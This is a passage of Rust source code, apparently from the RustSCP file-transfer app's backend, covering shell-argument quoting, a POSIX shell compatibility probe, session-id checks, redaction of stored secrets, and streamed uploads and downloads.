use rustscp_actions::{ActionCatalog, ActionContext, ActionDefinition, ActionExecutor};
use rustscp_core::{
    get_rustscp_config_dir, BookmarkItem, CacheStats, CodeGenerator, CodeTargetLanguage,
    ConnectionConfig, DirectoryDiffItem, DirectoryDiffType, FileEntry, FileMaskFilter,
    FileSystemInfo, FindFileMatch, FindFileQuery, FtpConfig, FtpDriver, LocalFsDriver,
    ManagedDiskCache, Protocol, QueueTransferTask, RemoteSystemInfo, RemoteTrashItem,
    RemoteTrashStatus, S3Config, S3Driver, ScriptCommandOutput, ScriptInterpreter, SftpDriver,
    SyncEngine, SyncItem, SyncOptions, TransferQueueManager, VirtualDiskInfo, VirtualFileSystem,
    WebDavServer,
};
use rustscp_mcp::{
    ApprovalDecision, ApprovalRequest, AuditEvent, AuditLogger, ConnectionInfo, McpGateway,
    McpServer, ToolApprover,
};
use serde::{Deserialize, Serialize};
use sha2::{Digest, Sha256};
use std::collections::HashMap;
use std::sync::atomic::{AtomicBool, AtomicU64, Ordering};
use std::sync::Arc;
use tokio::sync::{broadcast, Mutex, RwLock};

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct McpStatusInfo {
    /// Agents can connect right now (the build has a transport and the app is listening).
    pub enabled: bool,
    /// Sessions agents can use (connected remote sessions; never the local disk).
    pub active_sessions_count: usize,
    pub total_audit_events: usize,
    /// Whether this build ships an MCP transport (`rustscp_mcp::MCP_TRANSPORT_AVAILABLE`).
    #[serde(default)]
    pub transport_available: bool,
    /// Whether the app is accepting agent connections (`--mcp-stdio` bridges).
    #[serde(default)]
    pub transport_running: bool,
    /// Agents connected right now.
    #[serde(default)]
    pub connected_agents: usize,
    /// `claude mcp add ...` command for this executable.
    #[serde(default)]
    pub setup_command: Option<String>,
    /// `mcpServers` JSON for other clients (Cursor, Claude Desktop, ...).
    #[serde(default)]
    pub setup_json: Option<String>,
    /// Why the gateway could not start, when it could not.
    #[serde(default)]
    pub gateway_error: Option<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct CommandExecutionResult {
    pub exit_code: i32,
    pub stdout: String,
    pub stderr: String,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ChecksumResult {
    pub algorithm: String,
    pub hash: String,
}

// ---------------------- SECURITY HELPERS ----------------------

/// Placeholder the WebView receives instead of a stored password, S3 secret or key
/// passphrase. Must stay equal to `STORED_SECRET` in `ui/src/utils/secrets.ts`.
pub const STORED_SECRET_MARKER: &str = "__RUSTSCP_STORED_SECRET__";

/// Longest session / saved-site id accepted as-is (ids end up in cache directory names).
const MAX_SESSION_ID_LEN: usize = 64;

/// Quotes one value for a POSIX shell (`sh`, `bash`, `zsh`, `dash`, busybox `ash`).
///
/// The value is wrapped in single quotes and every `'` is encoded as `'\''`, so the shell
/// sees exactly one word with the original bytes: `$`, backticks, `\`, `"`, `;`, `|`,
/// spaces and newlines all stay literal. Every value interpolated into a shell command
/// string in this file goes through this function.
pub(crate) fn sh_quote(value: &str) -> String {
    let mut out = String::with_capacity(value.len() + 2);
    out.push('\'');
    for ch in value.chars() {
        if ch == '\'' {
            out.push_str("'\\''");
        } else {
            out.push(ch);
        }
    }
    out.push('\'');
    out
}

/// [`sh_quote`]s every value and joins them with single spaces.
pub(crate) fn sh_join<S: AsRef<str>>(values: &[S]) -> String {
    values
        .iter()
        .map(|v| sh_quote(v.as_ref()))
        .collect::<Vec<_>>()
        .join(" ")
}

/// Command whose output proves that a server's login shell reads single quotes like `sh`.
/// Values reach remote commands through [`sh_quote`]; a shell that treats them differently
/// could run part of a file name: fish reads `\'` inside quotes as an escaped quote, and
/// cmd.exe / PowerShell ignore single quotes, so `&` in a name splits the command.
/// `sh`, `bash`, `dash`, `zsh`, `ksh` and busybox `ash` print exactly
/// [`POSIX_SHELL_PROBE_LINE`]; fish cannot parse the command, and in cmd.exe the `&` ends
/// it before the expected text (which also needs a `printf` it does not have).
const POSIX_SHELL_PROBE: &str = r"printf '%s\n' 'RUSTSCP_SHELL_'\''OK&\'";
const POSIX_SHELL_PROBE_LINE: &str = r"RUSTSCP_SHELL_'OK&\";

fn posix_shell_probe_passed(stdout: &str) -> bool {
    stdout
        .lines()
        .any(|line| line.trim_end_matches('\r') == POSIX_SHELL_PROBE_LINE)
}

/// Probe result per driver. A reconnect creates a new driver, which is probed again; the
/// `Weak` keeps a dropped driver's address from being reused while its entry exists.
type ShellCheck = (std::sync::Weak<dyn VirtualFileSystem>, bool);
static POSIX_SHELL_CHECKS: std::sync::Mutex<Vec<ShellCheck>> = std::sync::Mutex::new(Vec::new());

fn cached_posix_shell(vfs: &std::sync::Weak<dyn VirtualFileSystem>) -> Option<bool> {
    let checks = POSIX_SHELL_CHECKS
        .lock()
        .unwrap_or_else(|poisoned| poisoned.into_inner());
    checks
        .iter()
        .find(|(known, _)| known.ptr_eq(vfs))
        .map(|(_, ok)| *ok)
}

/// `true` when commands built with [`sh_quote`] are safe to run on `vfs`: the local
/// `/bin/sh` on macOS/Linux, or an SSH session whose login shell passed
/// [`POSIX_SHELL_PROBE`]. Otherwise callers use the file API or say that a POSIX shell is
/// needed, so a file name is never parsed by fish, cmd.exe or PowerShell.
pub(crate) async fn posix_shell_available(vfs: &Arc<dyn VirtualFileSystem>) -> bool {
    match vfs.protocol() {
        // Local commands run through cmd.exe on Windows.
        Protocol::Local => return !cfg!(target_os = "windows"),
        Protocol::Sftp => {}
        _ => return false,
    }
    if !vfs.supports_shell() {
        return false;
    }
    let weak = Arc::downgrade(vfs);
    if let Some(known) = cached_posix_shell(&weak) {
        return known;
    }
    let ok = match vfs.execute_command(POSIX_SHELL_PROBE).await {
        Ok((_, stdout, _)) => posix_shell_probe_passed(&stdout),
        // No shell, or connection trouble: not remembered (the driver remembers "no shell").
        Err(_) => return false,
    };
    if !ok {
        tracing::warn!(
            "the server's login shell is not POSIX-compatible (fish, cmd.exe, PowerShell...); \
             RustSCP will not send it commands that contain file names"
        );
    }
    let mut checks = POSIX_SHELL_CHECKS
        .lock()
        .unwrap_or_else(|poisoned| poisoned.into_inner());
    checks.retain(|(known, _)| known.strong_count() > 0);
    if !checks.iter().any(|(known, _)| known.ptr_eq(&weak)) {
        checks.push((weak, ok));
    }
    ok
}

/// Error for features that need a POSIX shell on the server.
fn posix_shell_required(feature: &str) -> String {
    format!(
        "{feature} needs a POSIX shell (sh, bash, zsh) on the server, and this session does not \
         provide one (SFTP-only account, or a login shell such as fish, cmd.exe or PowerShell)"
    )
}

/// A path/name operand that a command-line tool cannot mistake for an option:
/// values starting with `-` get a `./` prefix (works for tar, zip, unzip, cp, mv, cd...).
fn safe_operand(value: &str) -> String {
    if value.starts_with('-') {
        format!("./{value}")
    } else {
        value.to_string()
    }
}

fn has_control_chars(value: &str) -> bool {
    value.chars().any(|c| c.is_control())
}

/// `true` for ids matching `^[A-Za-z0-9_-]{1,64}$` (safe as a single path component).
pub(crate) fn is_valid_session_id(id: &str) -> bool {
    !id.is_empty()
        && id.len() <= MAX_SESSION_ID_LEN
        && id
            .bytes()
            .all(|b| b.is_ascii_alphanumeric() || b == b'_' || b == b'-')
}

fn require_valid_session_id(id: &str) -> Result<(), String> {
    if is_valid_session_id(id) {
        Ok(())
    } else {
        Err(format!("Invalid session id '{}'", id.escape_default()))
    }
}

/// Keeps `[A-Za-z0-9_-]`, turns runs of anything else into one `-`, caps the length.
fn sanitize_id_component(id: &str) -> String {
    let mut out = String::new();
    for c in id.chars() {
        if out.len() >= 40 {
            break;
        }
        if c.is_ascii_alphanumeric() || c == '_' || c == '-' {
            out.push(c);
        } else if !out.ends_with('-') {
            out.push('-');
        }
    }
    let trimmed = out.trim_matches('-');
    if trimmed.is_empty() {
        "session".to_string()
    } else {
        trimmed.to_string()
    }
}

/// Picks the id of a new session: the requested id when it is valid and not already
/// active, otherwise `<sanitized>-<8 hex chars>` (unique among `is_taken`).
pub(crate) fn choose_session_id(requested: &str, is_taken: impl Fn(&str) -> bool) -> String {
    if is_valid_session_id(requested) && !is_taken(requested) {
        return requested.to_string();
    }
    let base = sanitize_id_component(requested);
    loop {
        let suffix = uuid::Uuid::new_v4().simple().to_string();
        let candidate = format!("{}-{}", base, &suffix[..8]);
        if !is_taken(&candidate) {
            return candidate;
        }
    }
}

/// Saved-site ids become session ids, so they must be valid ids too. Invalid ones are
/// replaced by a stable id derived from the original (re-importing the same vault keeps
/// merging into the same entry); empty ids get a fresh one.
pub(crate) fn normalize_site_id(id: &str) -> String {
    if is_valid_session_id(id) {
        id.to_string()
    } else if id.is_empty() {
        format!("site-{}", uuid::Uuid::new_v4().simple())
    } else {
        let digest = hex::encode(Sha256::digest(id.as_bytes()));
        format!("site-{}", &digest[..16])
    }
}

fn redact_auth(auth: &rustscp_core::AuthMethod) -> rustscp_core::AuthMethod {
    use rustscp_core::AuthMethod;
    match auth {
        AuthMethod::Password(secret) if !secret.is_empty() => {
            AuthMethod::Password(STORED_SECRET_MARKER.to_string())
        }
        AuthMethod::PrivateKey {
            path,
            passphrase: Some(p),
        } if !p.is_empty() => AuthMethod::PrivateKey {
            path: path.clone(),
            passphrase: Some(STORED_SECRET_MARKER.to_string()),
        },
        other => other.clone(),
    }
}

/// Copy of a saved site that is safe to hand to the WebView: a non-empty password /
/// S3 secret / key passphrase is replaced by [`STORED_SECRET_MARKER`].
pub(crate) fn redact_site(site: &ConnectionConfig) -> ConnectionConfig {
    let mut copy = site.clone();
    copy.auth = redact_auth(&site.auth);
    copy
}

pub(crate) fn redact_sites(sites: &[ConnectionConfig]) -> Vec<ConnectionConfig> {
    sites.iter().map(redact_site).collect()
}

/// Swaps [`STORED_SECRET_MARKER`] in `incoming` for the secret stored in `stored` (the
/// saved site with the same id). Without a stored secret the marker becomes empty, so
/// the marker itself is never saved or sent to a server.
pub(crate) fn restore_stored_secret(
    incoming: &mut ConnectionConfig,
    stored: Option<&ConnectionConfig>,
) {
    use rustscp_core::AuthMethod;
    match &mut incoming.auth {
        AuthMethod::Password(secret) if secret == STORED_SECRET_MARKER => {
            *secret = match stored.map(|s| &s.auth) {
                Some(AuthMethod::Password(saved)) if saved != STORED_SECRET_MARKER => saved.clone(),
                _ => String::new(),
            };
        }
        AuthMethod::PrivateKey { passphrase, .. }
            if passphrase.as_deref() == Some(STORED_SECRET_MARKER) =>
        {
            *passphrase = match stored.map(|s| &s.auth) {
                Some(AuthMethod::PrivateKey {
                    passphrase: Some(saved),
                    ..
                }) if !saved.is_empty() && saved != STORED_SECRET_MARKER => Some(saved.clone()),
                _ => None,
            };
        }
        _ => {}
    }
}

/// Display name that is safe as a single file name (Desktop shortcut, mount folder,
/// volume label, PowerShell string): letters, digits, space, `_`, `-`, `.`; no `..`,
/// no leading `.`/`-`, at most 64 characters.
pub(crate) fn sanitize_display_name(name: &str, fallback: &str) -> String {
    let mut cleaned: String = name
        .chars()
        .map(|c| {
            if c.is_alphanumeric() || matches!(c, ' ' | '_' | '-' | '.') {
                c
            } else {
                '_'
            }
        })
        .take(64)
        .collect();
    while cleaned.contains("..") {
        cleaned = cleaned.replace("..", ".");
    }
    let trimmed = cleaned
        .trim()
        .trim_start_matches(['.', '-'])
        .trim_end_matches('.')
        .trim();
    if trimmed.is_empty() {
        fallback.to_string()
    } else {
        trimmed.to_string()
    }
}

/// Runs a local program with an argument vector (no shell) and captures its output.
#[cfg_attr(not(target_os = "windows"), allow(dead_code))]
async fn run_local_program(
    program: &str,
    args: &[String],
    cwd: Option<&str>,
) -> Result<(i32, String, String), String> {
    let mut cmd = tokio::process::Command::new(program);
    cmd.args(args);
    if let Some(dir) = cwd {
        cmd.current_dir(dir);
    }
    let output = cmd
        .output()
        .await
        .map_err(|e| format!("Failed to run '{}': {}", program, e))?;
    Ok((
        output.status.code().unwrap_or(-1),
        String::from_utf8_lossy(&output.stdout).to_string(),
        String::from_utf8_lossy(&output.stderr).to_string(),
    ))
}

/// Time limit for archive jobs and server-side folder copies. Compressing a few GB as
/// tar.xz takes well over the 10 minutes allowed to ordinary commands.
const LONG_COMMAND_TIMEOUT: std::time::Duration = std::time::Duration::from_secs(6 * 60 * 60);

/// Kills a local process group when dropped, unless disarmed first. Used so that a
/// timed-out or abandoned `/bin/sh -c` job takes `tar`, `gzip`, `xz`... down with it.
#[cfg(unix)]
struct ProcessGroupKiller(Option<u32>);

#[cfg(unix)]
impl ProcessGroupKiller {
    fn disarm(&mut self) {
        self.0 = None;
    }
}

#[cfg(unix)]
impl Drop for ProcessGroupKiller {
    fn drop(&mut self) {
        if let Some(pgid) = self.0.take() {
            // No libc in this crate: `kill -KILL -- -<pgid>` signals the whole group.
            let _ = std::process::Command::new("kill")
                .args(["-KILL", "--", &format!("-{pgid}")])
                .stdin(std::process::Stdio::null())
                .stdout(std::process::Stdio::null())
                .stderr(std::process::Stdio::null())
                .status();
        }
    }
}

/// Runs `cmd` with `/bin/sh -c` in a new process group, for local jobs that may take
/// hours (archives). When `limit` passes, or the caller stops waiting, the whole group is
/// killed, not only `sh`: a pipeline's `tar` / `xz` never keeps writing in the background
/// after the job was reported as failed.
#[cfg(unix)]
async fn run_local_shell_long(
    cmd: &str,
    limit: std::time::Duration,
) -> Result<(i32, String, String), String> {
    use tokio::io::AsyncReadExt;

    let mut child = tokio::process::Command::new("/bin/sh")
        .arg("-c")
        .arg(cmd)
        .process_group(0)
        .stdin(std::process::Stdio::null())
        .stdout(std::process::Stdio::piped())
        .stderr(std::process::Stdio::piped())
        .kill_on_drop(true)
        .spawn()
        .map_err(|e| format!("Failed to run the local shell: {e}"))?;
    // Declared after `child`, so it is dropped first: the group id is still `sh`'s pid
    // (alive or not yet reaped) when it is signalled.
    let mut killer = ProcessGroupKiller(child.id());
    let mut stdout_pipe = child.stdout.take();
    let mut stderr_pipe = child.stderr.take();

    let finished = tokio::time::timeout(limit, async {
        let read_out = async {
            let mut buf = Vec::new();
            if let Some(pipe) = stdout_pipe.as_mut() {
                let _ = pipe.read_to_end(&mut buf).await;
            }
            buf
        };
        let read_err = async {
            let mut buf = Vec::new();
            if let Some(pipe) = stderr_pipe.as_mut() {
                let _ = pipe.read_to_end(&mut buf).await;
            }
            buf
        };
        tokio::join!(child.wait(), read_out, read_err)
    })
    .await;

    match finished {
        Ok((Ok(status), stdout, stderr)) => {
            killer.disarm();
            Ok((
                status.code().unwrap_or(-1),
                String::from_utf8_lossy(&stdout).to_string(),
                String::from_utf8_lossy(&stderr).to_string(),
            ))
        }
        Ok((Err(e), _, _)) => Err(format!("Failed to run the local shell: {e}")),
        Err(_) => Err(format!(
            "The command did not finish within {} hours and was stopped",
            limit.as_secs() / 3600
        )),
    }
}

/// SFTP drivers by address, so long jobs can use the driver's own time limit
/// (`execute_remote_command_with_timeout`) through an `Arc<dyn VirtualFileSystem>`.
static SFTP_DRIVERS: std::sync::Mutex<Vec<std::sync::Weak<SftpDriver>>> =
    std::sync::Mutex::new(Vec::new());

fn register_sftp_driver(driver: &Arc<SftpDriver>) {
    let mut drivers = SFTP_DRIVERS
        .lock()
        .unwrap_or_else(|poisoned| poisoned.into_inner());
    drivers.retain(|known| known.strong_count() > 0);
    drivers.push(Arc::downgrade(driver));
}

fn sftp_driver_of(vfs: &Arc<dyn VirtualFileSystem>) -> Option<Arc<SftpDriver>> {
    let target = Arc::as_ptr(vfs) as *const ();
    let drivers = SFTP_DRIVERS
        .lock()
        .unwrap_or_else(|poisoned| poisoned.into_inner());
    drivers
        .iter()
        .find(|known| known.as_ptr() as *const () == target)
        .and_then(std::sync::Weak::upgrade)
}

/// Runs a long job (archive, server-side folder copy) with [`LONG_COMMAND_TIMEOUT`]
/// instead of the 10 minutes ordinary commands get: locally in its own process group,
/// over SSH with the driver's explicit time limit.
async fn execute_long_command(
    vfs: &Arc<dyn VirtualFileSystem>,
    cmd: &str,
) -> Result<(i32, String, String), String> {
    #[cfg(unix)]
    if vfs.protocol() == Protocol::Local {
        return run_local_shell_long(cmd, LONG_COMMAND_TIMEOUT).await;
    }
    if vfs.protocol() == Protocol::Sftp {
        if let Some(driver) = sftp_driver_of(vfs) {
            return driver
                .execute_remote_command_with_timeout(cmd.to_string(), LONG_COMMAND_TIMEOUT)
                .await
                .map_err(|e| match e {
                    rustscp_core::CoreError::Timeout(_) => format!(
                        "The command did not finish within {} hours; it may still be running on the server",
                        LONG_COMMAND_TIMEOUT.as_secs() / 3600
                    ),
                    other => command_error_message(other),
                });
        }
    }
    vfs.execute_command(cmd)
        .await
        .map_err(command_error_message)
}

/// Expands an empty path, `~` and `~/...` to the local user's home directory.
fn expand_local_home(path: &str) -> String {
    let home = std::env::var("HOME")
        .or_else(|_| std::env::var("USERPROFILE"))
        .unwrap_or_default();
    let trimmed = path.trim();
    if home.is_empty() {
        return trimmed.to_string();
    }
    if trimmed.is_empty() || trimmed == "~" {
        home
    } else if let Some(rest) = trimmed
        .strip_prefix("~/")
        .or_else(|| trimmed.strip_prefix("~\\"))
    {
        std::path::Path::new(&home)
            .join(rest)
            .to_string_lossy()
            .to_string()
    } else {
        trimmed.to_string()
    }
}

#[allow(dead_code)]
pub struct AppState {
    pub local_vfs: Arc<LocalFsDriver>,
    pub active_sessions: Arc<RwLock<HashMap<String, Arc<dyn VirtualFileSystem>>>>,
    pub session_configs: Arc<RwLock<HashMap<String, ConnectionConfig>>>,
    pub saved_sites: Arc<RwLock<Vec<ConnectionConfig>>>,
    pub bookmarks: Arc<RwLock<Vec<BookmarkItem>>>,
    pub continuous_sync_active: Arc<AtomicBool>,
    pub continuous_sync_cancel: Arc<Mutex<Option<broadcast::Sender<()>>>>,
    /// Bumped on every start, so a finished run never marks a newer run as stopped.
    pub continuous_sync_generation: Arc<AtomicU64>,
    /// Remote session the running continuous sync uploads to (stopped on disconnect).
    pub continuous_sync_session: Arc<Mutex<Option<String>>>,
    pub virtual_disks: Arc<Mutex<HashMap<String, WebDavServer>>>,
    /// Sessions whose virtual disk is being mounted right now (one mount at a time each).
    pub virtual_disks_mounting: Arc<Mutex<std::collections::HashSet<String>>>,
    pub disk_cache: Arc<ManagedDiskCache>,
    pub transfer_queue: Arc<TransferQueueManager>,
    pub mcp_server: Arc<McpServer>,
    pub audit_logger: AuditLogger,
    /// Listener for `--mcp-stdio` bridges (started once the window exists).
    pub mcp_gateway: Arc<std::sync::Mutex<McpGatewayState>>,
    /// Agent writes waiting for Allow / Deny in the window.
    pub mcp_approvals: Arc<McpApprovals>,
    /// Why the local vault could not be loaded at startup (`None` when it loaded fine).
    pub vault_load_error: Option<String>,
    /// Where the unreadable vault was moved (`sites.vault.corrupt-<unix_ts>`).
    pub vault_backup_path: Option<String>,
}

/// Loads the saved sites. An unreadable vault is never treated as "no sites": it is moved
/// aside as `sites.vault.corrupt-<unix_ts>` (the key file is kept) and the error is
/// returned so the UI can warn the user. Returns `(sites, load_error, backup_path)`.
fn load_saved_sites_at_startup() -> (Vec<ConnectionConfig>, Option<String>, Option<String>) {
    match rustscp_core::load_local_vault() {
        Ok(sites) => (sites, None, None),
        Err(err) => {
            let message = err.to_string();
            tracing::error!("could not load the local sites vault: {message}");
            match rustscp_core::vault::quarantine_local_vault() {
                Ok(moved) => {
                    let backup = moved.map(|p| p.to_string_lossy().to_string());
                    if let Some(path) = &backup {
                        tracing::warn!("unreadable vault preserved as {path}");
                    }
                    (Vec::new(), Some(message), backup)
                }
                Err(move_err) => {
                    tracing::error!("could not move the unreadable vault aside: {move_err}");
                    (
                        Vec::new(),
                        Some(format!(
                            "{message} (the vault file could not be moved aside: {move_err})"
                        )),
                        None,
                    )
                }
            }
        }
    }
}

impl AppState {
    pub fn new() -> Self {
        // Agent activity also goes to a private JSON-lines file that survives restarts.
        let audit = AuditLogger::with_log_file(get_rustscp_config_dir().join(MCP_AUDIT_LOG_FILE));
        let mcp = Arc::new(McpServer::new(audit.clone()));
        let mut active: HashMap<String, Arc<dyn VirtualFileSystem>> = HashMap::new();
        let mut configs = HashMap::new();

        let local_cfg = ConnectionConfig::local();
        let local_driver = Arc::new(LocalFsDriver::new());

        active.insert("local".to_string(), local_driver.clone());
        configs.insert("local".to_string(), local_cfg.clone());

        let (loaded_sites, vault_load_error, vault_backup_path) = load_saved_sites_at_startup();
        let mut initial_sites: Vec<ConnectionConfig> = loaded_sites
            .into_iter()
            .map(|mut site| {
                site.id = normalize_site_id(&site.id);
                site
            })
            .collect();
        if !initial_sites.iter().any(|s| s.id == "local") {
            initial_sites.insert(0, local_cfg.clone());
        }

        Self {
            local_vfs: local_driver,
            active_sessions: Arc::new(RwLock::new(active)),
            session_configs: Arc::new(RwLock::new(configs)),
            saved_sites: Arc::new(RwLock::new(initial_sites)),
            bookmarks: Arc::new(RwLock::new(Vec::new())),
            continuous_sync_active: Arc::new(AtomicBool::new(false)),
            continuous_sync_cancel: Arc::new(Mutex::new(None)),
            continuous_sync_generation: Arc::new(AtomicU64::new(0)),
            continuous_sync_session: Arc::new(Mutex::new(None)),
            virtual_disks: Arc::new(Mutex::new(HashMap::new())),
            virtual_disks_mounting: Arc::new(Mutex::new(std::collections::HashSet::new())),
            disk_cache: Arc::new(ManagedDiskCache::default()),
            transfer_queue: Arc::new(TransferQueueManager::new(3)),
            mcp_server: mcp,
            audit_logger: audit,
            mcp_gateway: Arc::new(std::sync::Mutex::new(McpGatewayState::default())),
            mcp_approvals: Arc::new(McpApprovals::default()),
            vault_load_error,
            vault_backup_path,
        }
    }
}

// ---------------------- SESSION LOOKUP ----------------------

/// Clones the session's driver out of the registry. The global `active_sessions` guard is
/// released before the caller does any I/O, so a slow listing, transfer or command never
/// makes `connect_session` / `disconnect_session` (writers) and every later reader wait.
async fn get_vfs(state: &AppState, session_id: &str) -> Result<Arc<dyn VirtualFileSystem>, String> {
    state
        .active_sessions
        .read()
        .await
        .get(session_id)
        .cloned()
        .ok_or_else(|| format!("Session '{}' not found", session_id))
}

/// Like [`get_vfs`] with a role in the error message ("Source", "Local", ...).
async fn get_vfs_as(
    state: &AppState,
    session_id: &str,
    role: &str,
) -> Result<Arc<dyn VirtualFileSystem>, String> {
    state
        .active_sessions
        .read()
        .await
        .get(session_id)
        .cloned()
        .ok_or_else(|| format!("{} session '{}' not found", role, session_id))
}

// ---------------------- STREAMING HELPERS ----------------------

/// Chunk size for streamed reads and writes (checksums, copies, editor downloads).
const STREAM_CHUNK_BYTES: u64 = 4 * 1024 * 1024;

/// Largest file `read_file_content` hands to the built-in editor.
pub(crate) const EDITOR_MAX_BYTES: u64 = 10 * 1024 * 1024;

/// Error code for files too big for the built-in editor (`RUSTSCP_E_TOO_LARGE:<bytes>`).
const E_TOO_LARGE: &str = "RUSTSCP_E_TOO_LARGE";
/// Error code for binary / non-UTF-8 files (never lossy-decoded).
const E_BINARY: &str = "RUSTSCP_E_BINARY";
/// Error code for an archive name that already exists (`RUSTSCP_E_EXISTS: '<name>' ...`);
/// the UI confirms and calls again with `overwrite: true`.
const E_EXISTS: &str = "RUSTSCP_E_EXISTS";

fn core_err(e: rustscp_core::CoreError) -> String {
    e.to_string()
}

/// Copies `src_path` to `dst_path`. Destinations with positional writes (local, SFTP) get
/// the file chunk by chunk, so it is never held in memory as a whole; the others (S3,
/// FTP) get a single `write_file`. Returns the number of bytes copied.
async fn stream_copy_file(
    src: &Arc<dyn VirtualFileSystem>,
    src_path: &str,
    dst: &Arc<dyn VirtualFileSystem>,
    dst_path: &str,
) -> Result<u64, String> {
    if !dst.supports_write_at() {
        let data = src.read_file(src_path).await.map_err(core_err)?;
        let len = data.len() as u64;
        dst.write_file(dst_path, data).await.map_err(core_err)?;
        return Ok(len);
    }
    let mut offset = 0u64;
    loop {
        let chunk = src
            .read_range(src_path, offset, STREAM_CHUNK_BYTES)
            .await
            .map_err(core_err)?;
        let len = chunk.len() as u64;
        if len == 0 && offset > 0 {
            break;
        }
        // offset 0 creates / truncates the destination, even for an empty source.
        dst.write_at(dst_path, offset, chunk)
            .await
            .map_err(core_err)?;
        offset += len;
        if len < STREAM_CHUNK_BYTES {
            break;
        }
    }
    Ok(offset)
}

/// Fills `buf` from `file` until it is full or the file ends; returns the bytes read.
async fn read_full(file: &mut tokio::fs::File, buf: &mut [u8]) -> std::io::Result<usize> {
    use tokio::io::AsyncReadExt;
    let mut filled = 0;
    while filled < buf.len() {
        let n = file.read(&mut buf[filled..]).await?;
        if n == 0 {
            break;
        }
        filled += n;
    }
    Ok(filled)
}

/// Uploads a local file to `remote_path`, streamed in chunks when the driver supports
/// positional writes. Returns the number of bytes uploaded.
async fn upload_local_file(
    vfs: &Arc<dyn VirtualFileSystem>,
    local_path: &std::path::Path,
    remote_path: &str,
) -> Result<u64, String> {
    if !vfs.supports_write_at() {
        let data = tokio::fs::read(local_path)
            .await
            .map_err(|e| format!("Could not read '{}': {}", local_path.display(), e))?;
        let len = data.len() as u64;
        vfs.write_file(remote_path, bytes::Bytes::from(data))
            .await
            .map_err(core_err)?;
        return Ok(len);
    }
    let mut file = tokio::fs::File::open(local_path)
        .await
        .map_err(|e| format!("Could not read '{}': {}", local_path.display(), e))?;
    let mut buf = vec![0u8; STREAM_CHUNK_BYTES as usize];
    let mut offset = 0u64;
    loop {
        let n = read_full(&mut file, &mut buf)
            .await
            .map_err(|e| format!("Could not read '{}': {}", local_path.display(), e))?;
        if n == 0 && offset > 0 {
            break;
        }
        vfs.write_at(
            remote_path,
            offset,
            bytes::Bytes::copy_from_slice(&buf[..n]),
        )
        .await
        .map_err(core_err)?;
        offset += n as u64;
        if n < buf.len() {
            break;
        }
    }
    Ok(offset)
}

/// Creates `path` for writing with owner-only permissions (0600 on Unix); fails if it exists.
fn create_private_file(path: &std::path::Path) -> std::io::Result<std::fs::File> {
    let mut options = std::fs::OpenOptions::new();
    options.write(true).create_new(true);
    #[cfg(unix)]
    {
        use std::os::unix::fs::OpenOptionsExt;
        options.mode(0o600);
    }
    options.open(path)
}

/// Downloads `remote_path` into a new private local file, one chunk at a time.
async fn download_to_private_file(
    vfs: &Arc<dyn VirtualFileSystem>,
    remote_path: &str,
    local_path: &std::path::Path,
) -> Result<u64, String> {
    use tokio::io::AsyncWriteExt;
    let std_file = create_private_file(local_path)
        .map_err(|e| format!("Could not create '{}': {}", local_path.display(), e))?;
    let mut file = tokio::fs::File::from_std(std_file);
    let mut offset = 0u64;
    loop {
        let chunk = vfs
            .read_range(remote_path, offset, STREAM_CHUNK_BYTES)
            .await
            .map_err(core_err)?;
        if chunk.is_empty() {
            break;
        }
        file.write_all(&chunk)
            .await
            .map_err(|e| format!("Could not write '{}': {}", local_path.display(), e))?;
        offset += chunk.len() as u64;
        if (chunk.len() as u64) < STREAM_CHUNK_BYTES {
            break;
        }
    }
    file.flush()
        .await
        .map_err(|e| format!("Could not write '{}': {}", local_path.display(), e))?;
    file.sync_all()
        .await
        .map_err(|e| format!("Could not write '{}': {}", local_path.display(), e))?;
    Ok(offset)
}

/// New private (0700) directory under the system temp dir.
fn create_private_temp_dir(prefix: &str) -> Result<std::path::PathBuf, String> {
    let dir = std::env::temp_dir().join(format!("{}-{}", prefix, uuid::Uuid::new_v4().simple()));
    #[cfg(unix)]
    let created = {
        use std::os::unix::fs::DirBuilderExt;
        std::fs::DirBuilder::new().mode(0o700).create(&dir)
    };
    #[cfg(not(unix))]
    let created = std::fs::create_dir(&dir);
    created.map_err(|e| format!("Could not create a temporary folder: {}", e))?;
    Ok(dir)
}

/// Last path component of a remote path, usable as a local file name (keeps the
/// extension so the editor picks the right syntax mode).
pub(crate) fn local_file_name_for(remote_path: &str) -> String {
    let trimmed = remote_path.trim_end_matches(['/', '\\']);
    let base = trimmed.rsplit(['/', '\\']).next().unwrap_or(trimmed);
    let cleaned: String = base
        .chars()
        .map(|c| {
            if c.is_control() || matches!(c, ':' | '*' | '?' | '"' | '<' | '>' | '|') {
                '_'
            } else {
                c
            }
        })
        .take(120)
        .collect();
    let cleaned = cleaned.trim().trim_start_matches('-').to_string();
    if cleaned.is_empty() || cleaned == "." || cleaned == ".." {
        "file".to_string()
    } else {
        cleaned
    }
}

/// Text for the built-in editor: rejects binary data (a NUL byte in the first 8 KiB) and
/// invalid UTF-8 with [`E_BINARY`] instead of replacing bytes, so saving can never
/// corrupt a Latin-1 or binary file.
pub(crate) fn decode_editor_text(bytes: Vec<u8>) -> Result<String, String> {
    let head = &bytes[..bytes.len().min(8 * 1024)];
    if head.contains(&0) {
        return Err(E_BINARY.to_string());
    }
    String::from_utf8(bytes).map_err(|_| E_BINARY.to_string())
}

// ---------------------- S3 ENDPOINT ----------------------

/// Splits `scheme://authority/rest` into its parts (`rest` keeps its leading `/`).
fn split_url(url: &str) -> (&str, &str, &str) {
    let (scheme, after) = match url.find("://") {
        Some(i) => (&url[..i + 3], &url[i + 3..]),
        None => ("", url),
    };
    match after.find('/') {
        Some(i) => (scheme, &after[..i], &after[i..]),
        None => (scheme, after, ""),
    }
}

/// True when a URL authority (`host`, `host:9000`, `[::1]:9000`) carries a port.
fn authority_has_port(authority: &str) -> bool {
    let host_end = authority.rfind(']').map(|i| i + 1).unwrap_or(0);
    authority[host_end..]
        .rsplit_once(':')
        .is_some_and(|(_, p)| !p.is_empty() && p.chars().all(|c| c.is_ascii_digit()))
}

/// S3 endpoint URL from the Host field (`s3.eu-west-1.amazonaws.com`, `minio.lan`,
/// `http://minio.lan:9000`) and the Port field. `https://` is assumed without a scheme;
/// a non-default port is appended unless the host already has one (22/21 are the SSH /
/// FTP defaults the form may still hold and are ignored).
pub(crate) fn s3_endpoint(host: &str, port: u16) -> String {
    let host = host.trim().trim_end_matches('/');
    let lower = host.to_ascii_lowercase();
    let endpoint = if lower.starts_with("http://") || lower.starts_with("https://") {
        host.to_string()
    } else {
        format!("https://{}", host)
    };
    if matches!(port, 0 | 21 | 22 | 80 | 443) {
        return endpoint;
    }
